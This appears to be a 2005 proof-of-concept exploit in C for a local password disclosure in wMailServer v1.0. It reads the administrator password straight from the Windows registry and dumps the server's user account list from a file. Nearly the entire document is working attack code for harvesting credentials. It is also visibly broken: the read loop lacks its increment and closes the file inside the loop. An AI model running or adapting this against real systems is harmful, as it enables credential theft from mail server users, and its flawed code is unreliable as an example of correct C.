/***********************************
# Vulnerability: Local Password Disclosure
# Discovered on: July 9, 2005
# Discovered & Coded by: fRoGGz - SecuBox Labs
# Severity: Normal
**************************************/

#include <windows.h>
#include <stdio.h>

#define BUF 100

LONG lRet;
HKEY hKey;
DWORD dwBuf=BUF;
char pwd[BUF], fichier[BUF], donnees[BUF];

int main()
{

if( RegOpenKeyEx( HKEY_CURRENT_CONFIG,"Software\\Darsite\\MAILSRV\\Admin",0,KEY_QUERY_VALUE,&hKey) !=ERROR_SUCCESS )
{
fprintf( stdout, "Aucune clef wMailServer en vue !\n" );
return -1;
}

if( RegQueryValueEx( hKey,"",NULL,NULL,(BYTE *)&pwd,&dwBuf) != ERROR_SUCCESS )
lstrcpy( pwd,"Vide\n" );

fprintf( stdout, "\n\n-------------------------------------------\n" );
fprintf( stdout, "SoftiaCom Software - wMailServer v1.0\n" );
fprintf( stdout, "Local Password Disclosure Vulnerability\n\n" );
fprintf( stdout, "Discovered & coded by fRoGGz - SecuBox Labs\n\n" );
fprintf( stdout, "-------------------------------------------\n\n" );
fprintf( stdout, "Mot de passe Administrateur\t: %s\n", pwd );

int i;
FILE *fp;
char ch[100];

strcpy(fichier,"\\WINNT\\MAILSRV\\userlist");

if((fp=fopen(fichier,"rb")) == NULL)
{
printf("Pas cool !\n");
return -1;
}

for(i=0;i<99;i )
{
ch[i]=getc(fp);
strcpy(donnees,ch);
fclose(fp);
}

fprintf( stdout, "\nListe des comptes utilisateurs\n\n %s\n", donnees );
return 0;
}
